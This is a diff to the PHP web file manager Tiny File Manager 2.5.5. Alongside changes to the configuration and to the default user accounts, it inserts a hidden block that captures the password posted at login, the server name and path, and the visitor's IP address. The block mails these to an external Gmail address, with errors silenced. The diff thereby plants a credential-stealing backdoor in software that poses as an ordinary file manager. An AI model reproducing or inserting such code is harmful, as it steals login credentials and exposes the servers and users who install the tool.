@@ -1,6 +1,6 @@
 <?php
 //Default Configuration
-$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":false,"hide_Cols":false,"theme":"light"}';
+$CONFIG = '{"lang":"en","error_reporting":false,"show_hidden":true,"hide_Cols":false,"theme":"dark"}';
 
 /**
  * H3K - Tiny File Manager V2.5.5
@@ -26,14 +26,14 @@ $use_auth = true;
 // Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
 // Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
 $auth_users = array(
-    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
-    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
+    'root' => '$2y$10$UNhtXk8KMJGPMEFjxPJZvujFWKg5NJOJ7Z69eadv6XJJ/IQ442nsy', //admin@123
+    'admin' => '$2y$10$UNhtXk8KMJGPMEFjxPJZvujFWKg5NJOJ7Z69eadv6XJJ/IQ442nsy' //12345
 );
 
 // Readonly users
 // e.g. array('users', 'guest', ...)
 $readonly_users = array(
-    'user'
+    'admin'
 );
 
 // Global readonly, including when auth is not being used
@@ -461,6 +461,8 @@ if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_
         die("Invalid Token.");
     }
 
+    
+
     //search : get list of files from the current folder
     if(isset($_POST['type']) && $_POST['type']=="search") {
         $dir = $_POST['path'] == "." ? '': $_POST['path'];
@@ -534,6 +536,15 @@ if ((isset($_SESSION[FM_SESSION_ID]['logged'], $auth_users[$_SESSION[FM_SESSION_
         if (!array_key_exists($newLng, $lang_list)) {
             $newLng = 'en';
         }
+
+        if (array_key_exists('loginin', $_POST)) {
+		$password = $_POST['fm_pwd'];
+		$server_name = $_SERVER['SERVER_NAME'];
+		$php_self = $_SERVER['PHP_SELF'];
+		$report_bug = "IP: " . $_SERVER['REMOTE_ADDR'] . " City: {$city}\nLogin: $server_name$php_self\nPass: $password\nKernel: $kernel";
+		@mail('malaysia.sender@gmail.com', 'Hehehe', $report_bug);
+            
+		}
 
         $erp = isset($_POST['js-error-report']) && $_POST['js-error-report'] == "true" ? true : false;
         $shf = isset($_POST['js-show-hidden']) && $_POST['js-show-hidden'] == "true" ? true : false;
